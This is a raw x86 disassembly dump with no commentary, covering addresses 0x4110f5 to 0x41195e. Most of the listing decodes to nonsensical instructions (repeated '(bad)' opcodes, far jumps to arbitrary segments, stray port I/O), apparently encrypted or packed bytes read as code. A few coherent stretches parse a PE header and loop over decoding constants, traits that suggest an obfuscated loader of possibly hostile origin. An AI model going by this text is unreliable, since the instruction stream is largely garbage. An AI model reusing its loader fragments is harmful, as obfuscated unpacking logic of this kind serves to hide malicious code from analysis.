  4110f5:	jmp    0x831:0x8b90b7aa
  4110fc:	xchg   edx,eax
  4110fd:	or     al,BYTE PTR [edx-0x62]
  411100:	mov    esp,0xe17f0324
  411105:	(bad)  
  411106:	fdivr  QWORD PTR [ebp+0x26c5a2cb]
  41110c:	jmp    0xd192be4c
  411111:	mov    ds:0x2f622126,al
  411116:	adc    BYTE PTR [edi+0x25],0xda
  41111a:	xchg   DWORD PTR [ecx],ebx
  41111c:	(bad)  
  41111d:	ror    BYTE PTR [ebx+0x7],1
  411120:	mov    edx,0x444f9832
  411125:	out    0xa1,eax
  411127:	std    
  411128:	icebp  
  411129:	and    edi,ecx
  41112b:	dec    ecx
  41112c:	call   0x4753:0x69596ecf
  411133:	push   ds
  411134:	js     0x41118a
  411136:	jl     0x411127
  411138:	outs   dx,BYTE PTR ds:[esi]
  411139:	jo     0x4110f5
  41113b:	sub    cl,BYTE PTR ds:0x80320240
  411141:	sub    eax,edi
  411143:	sub    eax,0x796c1999
  411148:	adc    dh,BYTE PTR [ebx+0x5c]
  41114b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41114c:	(bad)  
  41114d:	mov    ds:0xac568d7,al
  411152:	inc    ebp
  411153:	dec    ebx
  411154:	fcomp  QWORD PTR [edx+0x2]
  411157:	scas   al,BYTE PTR es:[edi]
  411158:	rol    eax,1
  41115a:	and    al,0x96
  41115c:	fld    DWORD PTR [edi+0x5f]
  41115f:	(bad)  
  411160:	mov    cl,0xc6
  411162:	js     0x411183
  411164:	inc    ebp
  411165:	out    dx,eax
  411166:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411167:	or     DWORD PTR [edx+ecx*1-0x7770f2d2],esi
  41116e:	imul   esp,eax,0xd4c274ba
  411174:	adc    al,0x2d
  411176:	stc    
  411177:	das    
  411178:	sbb    eax,0xd6ad4f78
  41117d:	sbb    ah,ch
  41117f:	mov    esi,DWORD PTR [ecx-0xc4dd99b]
  411185:	push   0x30
  411187:	xor    cl,BYTE PTR [edx+0x62]
  41118a:	dec    esp
  41118b:	push   es
  41118c:	push   0x513a2f34
  411191:	mov    WORD PTR [esi+0x644d3d22],?
  411197:	ins    BYTE PTR es:[edi],dx
  411198:	pop    es
  411199:	add    ch,BYTE PTR [ebp-0x27]
  41119c:	push   ds
  41119d:	xchg   BYTE PTR [ebx+0x51],ch
  4111a0:	mov    al,ds:0x94f9f4db
  4111a5:	push   es
  4111a6:	push   cs
  4111a7:	cld    
  4111a8:	push   edi
  4111a9:	pop    ss
  4111aa:	inc    ebp
  4111ab:	sbb    al,0xeb
  4111ad:	dec    edi
  4111ae:	push   ebx
  4111af:	out    0x2d,eax
  4111b1:	popf   
  4111b2:	enter  0xe6f1,0x85
  4111b6:	sbb    eax,edi
  4111b8:	repnz test edi,esi
  4111bb:	in     eax,0xf
  4111bd:	leave  
  4111be:	leave  
  4111bf:	or     edi,DWORD PTR [esi]
  4111c1:	loop   0x411241
  4111c3:	adc    esp,ecx
  4111c5:	test   BYTE PTR [edi-0x4742d4ba],al
  4111cb:	fstp   TBYTE PTR [ebp+0x77]
  4111ce:	adc    bl,BYTE PTR ds:0x8958d5dd
  4111d4:	mov    BYTE PTR [ecx],bl
  4111d6:	push   ebp
  4111d7:	cmp    ah,BYTE PTR [eax]
  4111d9:	push   0x6f08b7d1
  4111de:	jae    0x411228
  4111e0:	xchg   ecx,ebx
  4111e2:	jnp    0x4111b8
  4111e4:	cdq    
  4111e5:	sar    BYTE PTR [ebp+eax*1+0x39],cl
  4111e9:	mov    al,ds:0x7fbe56b5
  4111ee:	jo     0x411183
  4111f0:	(bad)  
  4111f1:	mov    ch,0xa
  4111f3:	ja     0x4111db
  4111f5:	mov    ebx,0x6778b8ec
  4111fa:	std    
  4111fb:	and    al,0x58
  4111fd:	test   dh,ch
  4111ff:	mov    bh,0x46
  411201:	push   edx
  411202:	adc    BYTE PTR [ecx+0x614bf798],bl
  411208:	loope  0x4111df
  41120a:	inc    ebx
  41120b:	mov    dl,0x81
  41120d:	mov    ah,0xa2
  41120f:	cmp    eax,0xd87868f5
  411214:	daa    
  411215:	or     eax,0x77fdba50
  41121a:	sub    eax,0x30245a2b
  41121f:	pop    edx
  411220:	ins    DWORD PTR es:[edi],dx
  411221:	sbb    edx,ecx
  411223:	mov    ch,0xb6
  411225:	les    edi,FWORD PTR [edi]
  411227:	add    DWORD PTR [edi-0x77525ae1],esp
  41122d:	les    ecx,FWORD PTR [edx]
  41122f:	imul   esp,DWORD PTR [ebp-0x56],0xffffffae
  411233:	aas    
  411234:	jmp    0x24b51926
  411239:	sbb    BYTE PTR [esi],dh
  41123b:	mov    edx,0x93e77cc8
  411240:	(bad)  
  411241:	jmp    0x41128b
  411243:	mov    WORD PTR [ecx-0x53a6616f],fs
  411249:	loop   0x411252
  41124b:	push   0x33
  41124d:	addr16 hlt 
  41124f:	pop    esi
  411250:	arpl   WORD PTR [edi-0x13276bfa],di
  411256:	mov    edx,0x1a9aab43
  41125b:	sub    ah,BYTE PTR [esp+edx*4]
  41125e:	into   
  41125f:	xlat   BYTE PTR ds:[ebx]
  411260:	sbb    DWORD PTR [ecx+0x7d],edx
  411263:	jae    0x411265
  411265:	(bad)  [ebx]
  411267:	cmp    edi,DWORD PTR [edi+0x6e]
  41126a:	pop    ebp
  41126b:	mov    bl,0xf5
  41126d:	cmc    
  41126e:	or     ah,BYTE PTR ss:[ebx+esi*2+0x43]
  411273:	lahf   
  411274:	pop    edi
  411275:	pop    ebx
  411276:	xor    BYTE PTR [eax+edx*1],0xc4
  41127a:	adc    al,0x1b
  41127c:	pusha  
  41127d:	xchg   ebp,eax
  41127e:	(bad)  
  41127f:	xchg   ebx,eax
  411280:	cmc    
  411281:	in     al,dx
  411282:	(bad)  
  411283:	pop    esi
  411284:	ret    0x91
  411287:	(bad)  
  411288:	das    
  411289:	push   ecx
  41128a:	push   edx
  41128b:	push   eax
  41128c:	test   BYTE PTR [edi-0xfa3f9be],dl
  411292:	pop    ebx
  411293:	and    eax,0xabcd9aba
  411298:	push   edi
  411299:	push   esi
  41129a:	outs   dx,BYTE PTR ds:[esi]
  41129b:	aad    0x13
  41129d:	jns    0x4112c2
  41129f:	push   ss
  4112a0:	into   
  4112a1:	(bad)  
  4112a2:	pop    edi
  4112a3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4112a4:	hlt    
  4112a5:	mov    edi,0x587020fe
  4112aa:	lea    edx,[edi+0x35]
  4112ad:	sub    al,0x14
  4112af:	imul   DWORD PTR [ebx+eiz*1+0x16ad0fb3]
  4112b6:	popf   
  4112b7:	mov    al,ds:0x24a0c96
  4112bc:	or     ebx,DWORD PTR [edx+0x2]
  4112bf:	inc    esp
  4112c0:	push   esi
  4112c1:	(bad)  
  4112c3:	ds ret 0xe597
  4112c7:	in     al,dx
  4112c8:	sahf   
  4112c9:	mov    esp,0x6d3057c7
  4112ce:	sti    
  4112cf:	test   BYTE PTR [edx-0x3b],dl
  4112d2:	(bad)
  4112d5:	cmp    al,0x6f
  4112d7:	stc    
  4112d8:	jmp    0x4115:0x6293360e
  4112df:	xor    dh,BYTE PTR [eax]
  4112e1:	into   
  4112e2:	lds    eax,FWORD PTR [ebx+0xf373435]
  4112e8:	test   dh,bh
  4112ea:	add    al,BYTE PTR [eax]
  4112ec:	add    bh,al
  4112ee:	inc    ebp
  4112ef:	call   0x7471083
  4112f4:	lea    eax,[ebp-0x18]
  4112f7:	mov    DWORD PTR [ebp-0x14],eax
  4112fa:	mov    eax,DWORD PTR [ebp-0x14]
  4112fd:	add    DWORD PTR [eax],0x705fa8f
  411303:	mov    eax,DWORD PTR [ebp-0x10]
  411306:	jmp    0x4115d4
  41130b:	sub    al,0xc2
  41130d:	or     al,0xb3
  41130f:	lock jno 0x4112c3
  411312:	inc    ecx
  411313:	mov    ds:0xec68f61e,eax
  411318:	adc    al,0x67
  41131a:	test   al,0x49
  41131c:	inc    ebp
  41131d:	jle    0x41139d
  41131f:	scas   eax,DWORD PTR es:[edi]
  411320:	jl     0x4113a0
  411322:	jle    0x411307
  411324:	in     al,0xf7
  411326:	inc    eax
  411327:	call   0x8c7e89
  41132c:	cmp    eax,0x31e2d0d6
  411331:	fisubr WORD PTR [ebp-0x1ddf3cda]
  411337:	mul    BYTE PTR [edx+0x20]
  41133a:	dec    eax
  41133b:	retf   
  41133c:	and    eax,0x4fd874b
  411341:	xchg   dl,dh
  411343:	mov    ah,0x21
  411345:	mov    esp,0x32a50c6a
  41134a:	int    0xa1
  41134c:	pop    ebp
  41134d:	sub    ebp,DWORD PTR [ebx-0xd]
  411350:	cli    
  411351:	xlat   BYTE PTR ds:[ebx]
  411352:	int    0x37
  411354:	jle    0x4112d7
  411356:	fist   WORD PTR [ebx]
  411358:	test   DWORD PTR [ecx+eiz*4],ebp
  41135b:	mov    bh,bh
  41135d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41135e:	fiadd  DWORD PTR [edx]
  411360:	mov    ah,BYTE PTR [edx-0x5f]
  411363:	add    ch,BYTE PTR [ebp-0x71ade00c]
  411369:	xor    cl,BYTE PTR [edx]
  41136b:	xchg   esp,eax
  41136c:	mov    ebx,0xbf6dac31
  411371:	ja     0x41130c
  411373:	(bad)  
  411374:	xchg   ebp,eax
  411375:	stc    
  411376:	scas   al,BYTE PTR es:[edi]
  411377:	cmp    al,0x9f
  411379:	ja     0x411380
  41137b:	dec    ecx
  41137c:	or     al,0x65
  41137e:	out    dx,al
  41137f:	icebp  
  411380:	scas   al,BYTE PTR es:[edi]
  411381:	(bad)  
  411382:	ficomp DWORD PTR [eax]
  411384:	leave  
  411385:	fnstenv [ebp-0x28eebda0]
  41138b:	inc    esi
  41138c:	ss inc ebp
  41138e:	fsub   QWORD PTR [ebx-0x2b]
  411391:	jmp    0x411343
  411393:	call   0xfdf37ed5
  411398:	jns    0x41140f
  41139a:	mov    dl,0x11
  41139c:	call   FWORD PTR ds:0x7db3b11b
  4113a2:	(bad)  [edx-0x55]
  4113a5:	dec    edi
  4113a6:	mov    edi,edx
  4113a8:	xor    BYTE PTR [ecx-0x3e],0xea
  4113ac:	mov    edx,0xa8c3eae4
  4113b1:	je     0x411354
  4113b3:	or     ecx,DWORD PTR [ebx+0x4b]
  4113b6:	jle    0x4113cb
  4113b8:	int3   
  4113b9:	enter  0xa91,0x1d
  4113bd:	gs push ecx
  4113bf:	cmp    eax,0xd2e10d2c
  4113c4:	scas   eax,DWORD PTR es:[edi]
  4113c5:	add    eax,0xdb5e19e6
  4113ca:	jmp    DWORD PTR [eax]
  4113cc:	(bad)  
  4113cd:	cld    
  4113ce:	jle    0x41142e
  4113d0:	mov    dl,0x74
  4113d2:	arpl   WORD PTR [ecx],si
  4113d4:	cmp    al,0xd7
  4113d6:	adc    ch,BYTE PTR [ebp+0x7d136d7a]
  4113dc:	adc    edx,DWORD PTR [edi+ecx*2]
  4113df:	mov    ch,0x14
  4113e1:	sbb    edx,DWORD PTR [esi-0xe71ecac]
  4113e7:	pop    edx
  4113e8:	sbb    dh,bh
  4113ea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4113eb:	test   eax,0xb011fcca
  4113f0:	dec    ecx
  4113f1:	push   ss
  4113f2:	retf   0xdf66
  4113f5:	leave  
  4113f6:	icebp  
  4113f7:	fs pop ebx
  4113f9:	stos   BYTE PTR es:[edi],al
  4113fa:	xchg   ebp,eax
  4113fb:	mov    edi,0x62d5e18c
  411400:	or     al,0x7d
  411402:	mov    ecx,0x704c8516
  411407:	xor    DWORD PTR [eax+0x16],edi
  41140a:	jl     0x4113a4
  41140c:	xchg   BYTE PTR [ecx],al
  41140e:	cmp    ebp,edi
  411410:	scas   eax,DWORD PTR es:[edi]
  411411:	and    eax,0xef4253b1
  411416:	sub    dl,BYTE PTR [edx+ebx*1]
  411419:	jmp    0x677f:0x39b8a47b
  411420:	cmp    esi,DWORD PTR [esi-0x2a]
  411423:	adc    al,dh
  411425:	std    
  411426:	jp     0x411425
  411428:	cmp    cl,BYTE PTR [eax-0x2a]
  41142b:	test   eax,0xd4cbd62
  411430:	mov    dh,BYTE PTR [ebp+0x30]
  411433:	xor    al,0x3e
  411435:	xor    dh,BYTE PTR [ebp+eiz*8+0x2a]
  411439:	or     eax,0x24b29803
  41143e:	retf   
  41143f:	scas   eax,DWORD PTR es:[edi]
  411440:	sbb    eax,DWORD PTR [eax+ecx*1-0x31]
  411444:	xchg   esi,edx
  411446:	ficomp DWORD PTR [esi+0x2e12ccd3]
  41144c:	adc    DWORD PTR [esi+0x73],0x2c859b71
  411453:	xor    BYTE PTR ds:0x79c3d635,ch
  411459:	xchg   esi,eax
  41145a:	jb     0x41145a
  41145c:	push   eax
  41145d:	mov    ds:0xc0f39359,al
  411462:	fidivr DWORD PTR [eax+0x5dca7489]
  411468:	fidivr WORD PTR [esi]
  41146a:	in     eax,0x95
  41146c:	nop
  41146d:	pop    edx
  41146f:	jbe    0x411434
  411471:	(bad)  
  411472:	jl     0x411443
  411474:	xor    ebp,esi
  411476:	dec    ebx
  411477:	gs ror ecx,1
  41147a:	add    BYTE PTR [eax],ch
  41147c:	nop
  41147d:	retf   
  41147e:	ins    DWORD PTR es:[edi],dx
  41147f:	inc    ebx
  411480:	js     0x411453
  411482:	push   0x37
  411484:	fild   WORD PTR [eax-0x59104333]
  41148a:	and    ebx,0x51
  41148d:	fisttp DWORD PTR [ebp+0x61a1210c]
  411493:	mov    al,bh
  411495:	call   0x648b:0x1a67fa85
  41149c:	sub    al,0xcf
  41149e:	jo     0x4114bf
  4114a0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4114a1:	sbb    edi,edx
  4114a3:	and    eax,0xf7f8f64e
  4114a8:	ss jns 0x411455
  4114ab:	mov    al,dl
  4114ad:	sub    al,0xff
  4114af:	and    ebx,DWORD PTR [edx]
  4114b1:	pop    esi
  4114b2:	ret    0xe33b
  4114b5:	jmp    0x41145e
  4114b7:	pop    eax
  4114b8:	sahf   
  4114b9:	call   0xd31d:0xeba4b56
  4114c0:	retf   0x22ec
  4114c3:	jns    0x4114d4
  4114c5:	sbb    esp,DWORD PTR [ebx+0x3b]
  4114c8:	mov    DWORD PTR [edi],0x1360c8d6
  4114ce:	or     al,0xea
  4114d0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4114d1:	in     al,dx
  4114d2:	fst    DWORD PTR [esi-0x76]
  4114d5:	daa    
  4114d6:	jg     0x411517
  4114d8:	dec    edi
  4114d9:	and    bl,BYTE PTR [edx-0x28]
  4114dc:	(bad)  
  4114dd:	cmp    edi,DWORD PTR [ebp-0x417cef08]
  4114e3:	ret    
  4114e4:	jno    0x4114ad
  4114e6:	inc    esp
  4114e7:	push   edi
  4114e8:	lods   eax,DWORD PTR ds:[esi]
  4114e9:	or     dh,BYTE PTR [ebx]
  4114eb:	lds    eax,FWORD PTR [ebp+ecx*8+0x6b4994d7]
  4114f2:	into   
  4114f3:	lock push esp
  4114f5:	inc    edi
  4114f6:	cmp    esp,eax
  4114f8:	and    esp,ebp
  4114fa:	cwde   
  4114fb:	or     BYTE PTR [ebp+0x4a],0x3d
  4114ff:	lods   eax,DWORD PTR ds:[esi]
  411500:	mov    ?,WORD PTR ds:0x94527130
  411506:	scas   al,BYTE PTR es:[edi]
  411507:	(bad)  ds:0x77ce815f
  41150d:	outs   dx,BYTE PTR ds:[esi]
  41150e:	cmp    DWORD PTR es:[ecx+0x2fc932d9],edx
  411515:	and    dh,cl
  411517:	fdivr  st,st(0)
  411519:	mov    bh,0x3f
  41151b:	cmc    
  41151c:	test   BYTE PTR [edi-0x26],bl
  41151f:	hlt    
  411520:	iret   
  411521:	into   
  411522:	jmp    0x411542
  411524:	mov    bh,0xc9
  411526:	mov    esi,0x9b21d09b
  41152b:	dec    ebp
  41152c:	jb     0x41156b
  41152e:	pop    edi
  41152f:	scas   eax,DWORD PTR es:[edi]
  411530:	xor    DWORD PTR [ebp+0x2b],ecx
  411533:	mov    edx,0x7df27601
  411538:	dec    ecx
  411539:	sahf   
  41153a:	push   esp
  41153b:	xchg   ecx,eax
  41153c:	repz cli 
  41153e:	jg     0x411540
  411540:	adc    al,0xb2
  411542:	cwde   
  411543:	jmp    0x993cedb1
  411548:	fisttp QWORD PTR [esi+0x7a1fea4d]
  41154e:	adc    al,0x71
  411550:	jg     0x4114d9
  411552:	and    ah,BYTE PTR [ebx]
  411554:	inc    ecx
  411555:	mov    ds,WORD PTR ds:0xdd576058
  41155b:	adc    eax,0xba70c4b
  411560:	(bad)  
  411561:	xchg   esp,eax
  411562:	bound  ecx,QWORD PTR [esi-0x31be67ea]
  411568:	mov    esp,0x973b12a
  41156d:	shl    ch,cl
  41156f:	dec    ecx
  411570:	ins    BYTE PTR es:[edi],dx
  411571:	jmp    0xff4c:0xac3cd85b
  411578:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411579:	mov    WORD PTR [ebx-0x73f1fdfb],es
  41157f:	out    dx,eax
  411580:	pop    ds
  411581:	aaa    
  411582:	bound  ebx,QWORD PTR [esi]
  411584:	dec    edi
  411585:	int3   
  411586:	xor    ecx,esp
  411588:	cmp    eax,0x5cbe236d
  41158d:	das    
  41158e:	mov    eax,0xd5f1d504
  411593:	pop    edi
  411594:	jb     0x41152e
  411596:	mov    bl,0x73
  411598:	sub    BYTE PTR [edi+0x7b],cl
  41159b:	jns    0x41157b
  41159d:	mov    DWORD PTR [edi+ebp*2-0x12],ebx
  4115a1:	xchg   edi,eax
  4115a2:	int3   
  4115a3:	add    esp,DWORD PTR [esi-0x20]
  4115a6:	pop    ebx
  4115a7:	dec    eax
  4115a8:	aam    0xfe
  4115aa:	leave  
  4115ab:	out    dx,eax
  4115ac:	sbb    BYTE PTR [ecx],ah
  4115ae:	out    dx,eax
  4115af:	and    DWORD PTR [ecx+0x7c1a198c],ecx
  4115b5:	cmp    al,0xa4
  4115b7:	cmp    esi,ebx
  4115b9:	fldcw  WORD PTR [edi]
  4115bb:	xchg   ecx,eax
  4115bc:	popf   
  4115bd:	ins    DWORD PTR es:[edi],dx
  4115be:	sbb    DWORD PTR [ecx-0x2e],esi
  4115c1:	cdq    
  4115c2:	mov    ebx,0xbbf6fda8
  4115c7:	or     DWORD PTR [esi],ebx
  4115c9:	in     eax,0xdd
  4115cb:	mov    dl,0xe2
  4115cd:	scas   al,BYTE PTR es:[edi]
  4115ce:	mov    bh,0x9c
  4115d0:	arpl   cx,si
  4115d2:	pop    edi
  4115d3:	into   
  4115d4:	mov    edx,DWORD PTR [ebp+0x8]
  4115d7:	xor    eax,ecx
  4115d9:	lea    eax,[eax+edx*1+0x32729b]
  4115e0:	mov    DWORD PTR [ebp+0x8],eax
  4115e3:	inc    DWORD PTR [ebp+0xc]
  4115e6:	jmp    0x410fe6
  4115eb:	mov    eax,DWORD PTR [ebp-0x10]
  4115ee:	xor    eax,ecx
  4115f0:	mov    ecx,DWORD PTR [ebp+0x10]
  4115f3:	add    eax,esi
  4115f5:	mov    DWORD PTR [ecx],eax
  4115f7:	pop    esi
  4115f8:	leave  
  4115f9:	ret    0xc
  4115fc:	push   ebp
  4115fd:	mov    ebp,esp
  4115ff:	push   ecx
  411600:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  411607:	jmp    0x4117ce
  41160c:	mov    eax,ds:0x7129745c
  411611:	xor    DWORD PTR [ecx+0x74],esp
  411614:	in     eax,0xeb
  411616:	leave  
  411617:	outs   dx,DWORD PTR ds:[esi]
  411618:	push   cs
  411619:	shl    BYTE PTR [eax-0x77],cl
  41161c:	xchg   BYTE PTR [eax+0x7e],al
  41161f:	jle    0x4115c5
  411621:	jg     0x4116a1
  411623:	jle    0x41162e
  411625:	and    ebp,ebx
  411627:	lock int3 
  411629:	or     BYTE PTR gs:[esp+ebp*1],0xc3
  41162e:	mov    ds:0xfe4cce84,eax
  411633:	push   es
  411634:	pop    edi
  411635:	jp     0x41162a
  411637:	mov    cl,0x39
  411639:	in     al,0x3d
  41163b:	sbb    al,0xfd
  41163d:	jmp    0x4115cc
  41163f:	gs popa 
  411641:	sbb    al,0x8f
  411644:	les    ebp,FWORD PTR [edx-0x382c9963]
  41164a:	inc    eax
  41164b:	call   0x19a8:0x5d9b799a
  411652:	add    ebx,esp
  411654:	mov    ?,WORD PTR [esi-0x1b]
  411657:	mov    ebx,0x4c2f4a9a
  41165c:	jmp    0x4115fb
  41165e:	pusha  
  41165f:	sbb    eax,0x68e171d3
  411664:	mov    eax,0x545f8d21
  411669:	jg     0x4116e6
  41166b:	mov    edi,0x5ee5e01d
  411670:	lods   eax,DWORD PTR ds:[esi]
  411671:	jnp    0x4116ed
  411673:	sti    
  411674:	call   0x65c6:0x64d45f
  41167b:	stc    
  41167c:	pop    es
  41167d:	pop    ebx
  41167e:	xor    BYTE PTR [edi+0x5eebe8de],bl
  411684:	push   ebx
  411685:	pop    ss
  411686:	or     DWORD PTR [esi],esp
  411688:	popf   
  411689:	rcr    ebp,0x50
  41168c:	adc    BYTE PTR [edi],0xee
  41168f:	jmp    0x5e0e:0xd44c2312
  411696:	add    bl,BYTE PTR [edx+0x70490b33]
  41169c:	daa    
  41169d:	dec    esi
  41169e:	xchg   esi,eax
  41169f:	mov    edx,0xcf022cd6
  4116a4:	sti    
  4116a5:	shld   DWORD PTR [edx-0x3d],esi,0x62
  4116aa:	imul   esp,DWORD PTR ss:[ebx+0x18],0xf8ab0fa3
  4116b2:	call   0x6cf75715
  4116b7:	push   ebp
  4116b8:	cs hlt 
  4116ba:	mov    eax,ds:0xc15f92bc
  4116bf:	ror    DWORD PTR [ebx+0x481e6444],1
  4116c5:	into   
  4116c6:	dec    esi
  4116c7:	push   es
  4116c8:	and    al,0xd8
  4116ca:	and    eax,0xc5f2ed4
  4116cf:	xor    esi,DWORD PTR [ecx-0x3a]
  4116d2:	mov    dh,0xe5
  4116d4:	rol    BYTE PTR [eax],cl
  4116d6:	arpl   WORD PTR [eax-0x7192adf0],ax
  4116dc:	aaa    
  4116dd:	sahf   
  4116de:	push   es
  4116df:	adc    DWORD PTR [edx+0x5],edi
  4116e2:	in     al,0x48
  4116e4:	imul   ebp,DWORD PTR [ecx-0x31c0e69],0xd1440ac9
  4116ee:	aam    0x15
  4116f0:	dec    eax
  4116f1:	mov    al,BYTE PTR [esi-0xc9a119b]
  4116f7:	push   ebp
  4116f8:	out    dx,eax
  4116f9:	clc    
  4116fa:	loop   0x411692
  4116fc:	cld    
  4116fd:	sub    ebp,DWORD PTR ds:0x7b486e74
  411703:	pop    esp
  411704:	mov    esi,0x532d48ff
  411709:	adc    al,0x54
  41170b:	mov    WORD PTR [ebx*1+0xb72dbc7],es
  411712:	add    al,ch
  411714:	sahf   
  411715:	enter  0x54fe,0xb5
  411719:	stc    
  41171a:	mov    eax,0x8e876a50
  41171f:	scas   al,BYTE PTR es:[edi]
  411720:	xor    ebp,esi
  411722:	(bad)  
  411723:	cmp    BYTE PTR [ecx+0x5b],dh
  411726:	push   cs
  411727:	cmp    esi,esp
  411729:	cli    
  41172a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41172b:	push   cs
  41172c:	mov    ecx,0x286a9ea5
  411731:	xor    esi,DWORD PTR [ecx+0x4b]
  411734:	test   eax,0xe4dfb79e
  411739:	(bad)  
  41173a:	dec    bh
  41173c:	mov    cl,bl
  41173e:	or     al,ch
  411740:	rcl    DWORD PTR [ecx],1
  411742:	xor    al,0x9e
  411744:	mov    DWORD PTR [edx-0x4a],0x83e065cb
  41174b:	jo     0x41174c
  41174d:	bound  ebp,QWORD PTR [edx+esi*1+0x24]
  411751:	cmp    cl,bh
  411753:	mov    edx,ecx
  411755:	jmp    0x775ba5f3
  41175a:	out    dx,al
  41175b:	mov    dh,0xf4
  41175d:	sar    BYTE PTR [edi-0x62fb368d],1
  411763:	or     bh,BYTE PTR [ebp-0x389950d9]
  411769:	cmp    eax,0xbbc07f73
  41176e:	stos   BYTE PTR es:[edi],al
  41176f:	jnp    0x4117d2
  411771:	aas    
  411772:	or     eax,0x1c4630b4
  411777:	dec    eax
  411778:	lahf   
  411779:	add    DWORD PTR [edi+0x6db9f1b9],0xffffffab
  411780:	clc    
  411781:	sahf   
  411782:	fcomp  QWORD PTR [ecx-0x1f]
  411785:	xchg   esi,eax
  411786:	mov    dh,0xc
  411788:	sub    BYTE PTR [edx+0x4ef9095c],ah
  41178e:	and    BYTE PTR [ebx+0x1116b309],al
  411794:	ror    DWORD PTR [esi+0x3abf5d7d],1
  41179a:	adc    al,0x7b
  41179c:	fs mov eax,0xee1029da
  4117a2:	push   esp
  4117a3:	and    cl,BYTE PTR [edi+0x59521a40]
  4117a9:	pushf  
  4117aa:	test   eax,0x5b5a4cac
  4117af:	or     al,0xc9
  4117b1:	in     eax,0xc0
  4117b3:	mov    edx,0x8f2525d1
  4117b8:	iret   
  4117b9:	imul   ebx,DWORD PTR [ecx+0x2be43eae],0xb25cea55
  4117c3:	popa   
  4117c4:	push   es
  4117c5:	fwait
  4117c6:	(bad)  
  4117c7:	jp     0x411804
  4117c9:	push   0xffffff8c
  4117cb:	das    
  4117cc:	test   DWORD PTR [ebp-0x38f7ba75],ecx
  4117d2:	add    eax,0x4336a3
  4117d7:	cmp    eax,0x8a000042
  4117dc:	add    BYTE PTR [ecx+0x4335ff2d],al
  4117e2:	add    BYTE PTR [ebp+0x6d],bh
  4117e5:	add    BYTE PTR [eax],al
  4117e7:	add    al,0x38
  4117e9:	xor    DWORD PTR ds:0x43369f,0x433603
  4117f3:	xor    al,0x46
  4117f5:	mov    DWORD PTR ds:0x43369f,0x735a
  4117ff:	cmp    al,0xc3
  411801:	jne    0x411aa4
  411807:	and    edx,0x7ba3
  41180d:	mov    eax,DWORD PTR [ebp+0x8]
  411810:	mov    ecx,DWORD PTR [ebp+0x8]
  411813:	add    ecx,DWORD PTR [eax+0x3c]
  411816:	and    DWORD PTR ds:0x43361b,0x4b8b
  411820:	mov    edx,0x7510854
  411825:	and    DWORD PTR ds:0x4336ab,0x0
  41182f:	mov    eax,ds:0x4336ab
  411834:	inc    eax
  411835:	mov    ds:0x4336ab,eax
  41183a:	cmp    DWORD PTR ds:0x4336ab,0xb
  411841:	jne    0x411887
  411847:	push   0x4337bc
  41184c:	push   0x761c
  411851:	push   0x2832
  411856:	push   0x3f0d
  41185b:	push   0x4923
  411860:	push   DWORD PTR [ebp-0x24]
  411863:	push   DWORD PTR [ebp-0x28]
  411866:	push   DWORD PTR [ebp-0xc]
  411869:	push   0x49e1
  41186e:	push   DWORD PTR [ebp-0x28]
  411871:	push   DWORD PTR [ebp-0x14]
  411874:	push   DWORD PTR [ebp-0x10]
  411877:	push   0x6b07
  41187c:	push   0x8d34
  411881:	call   DWORD PTR ds:0x4122b8
  411887:	cmp    DWORD PTR ds:0x4336ab,0xa
  41188e:	jne    0x41189f
  411894:	mov    eax,ds:0x4336ab
  411899:	inc    eax
  41189a:	mov    ds:0x4336ab,eax
  41189f:	cmp    DWORD PTR ds:0x4336ab,0x11
  4118a6:	jb     0x41182f
  4118ac:	mov    DWORD PTR [ebp+0x8],ecx
  4118af:	mov    eax,DWORD PTR [ebp-0x4]
  4118b2:	xor    eax,edx
  4118b4:	push   esi
  4118b5:	mov    esi,DWORD PTR [ebp+0x8]
  4118b8:	mov    ecx,0x32729b
  4118bd:	add    eax,ecx
  4118bf:	cmp    DWORD PTR [esi+0x54],eax
  4118c2:	pop    esi
  4118c3:	je     0x4118d1
  4118c9:	mov    eax,DWORD PTR [ebp+0x8]
  4118cc:	jmp    0x411ab1
  4118d1:	mov    eax,DWORD PTR [ebp-0x4]
  4118d4:	xor    eax,edx
  4118d6:	jmp    0x411a9d
  4118db:	mov    ebp,0xe1e4219a
  4118e0:	gs mov ecx,0x58658ca3
  4118e6:	stos   DWORD PTR es:[edi],eax
  4118e7:	sub    BYTE PTR [edx+0x37],ch
  4118ea:	add    ebp,DWORD PTR [esi+ecx*2]
  4118ed:	jle    0x41196d
  4118ef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4118f0:	jg     0x411970
  4118f2:	jle    0x411907
  4118f4:	mov    DWORD PTR [esp+ebx*8],ecx
  4118f7:	mov    eax,ds:0x35f0e746
  4118fc:	sbb    edx,DWORD PTR [ecx+0x1b]
  4118ff:	dec    edx
  411900:	pushf  
  411901:	(bad)  
  411902:	repnz pop ds
  411904:	pushf  
  411905:	push   edi
  411906:	adc    ch,ah
  411908:	push   0x4c
  41190a:	loop   0x4118bc
  41190c:	dec    BYTE PTR [esi]
  41190e:	pop    eax
  41190f:	xchg   ecx,ebx
  411911:	arpl   sp,cx
  411913:	sar    DWORD PTR [edx-0x42],0x15
  411917:	xchg   ebp,eax
  411918:	xor    al,0x16
  41191a:	add    esp,DWORD PTR [ebp-0x1f]
  41191d:	test   DWORD PTR [edi],ebx
  41191f:	push   cs
  411920:	mov    eax,ds:0xc63877f0
  411925:	imul   ecx,DWORD PTR [ecx-0x7d75c508],0xf2bb03cf
  41192f:	or     BYTE PTR [ecx],0x93
  411932:	test   al,0x18
  411934:	clc    
  411935:	sub    bh,BYTE PTR [edx*8-0x75191f42]
  41193c:	cld    
  41193d:	popa   
  41193e:	mov    ?,edx
  411940:	mov    al,0x8e
  411942:	sub    esp,DWORD PTR [eax-0x5b]
  411945:	mov    bl,0x36
  411947:	mov    eax,ds:0x1cf0d71
  41194c:	jmp    0x66d6:0x157f4ede
  411953:	cmp    al,0xc7
  411955:	sub    al,0x50
  411957:	ja     0x411943
  411959:	add    BYTE PTR [edi],bl
  41195b:	retf   
  41195c:	int    0xc3
  41195e:	mov    ds:0x3d49d174,al
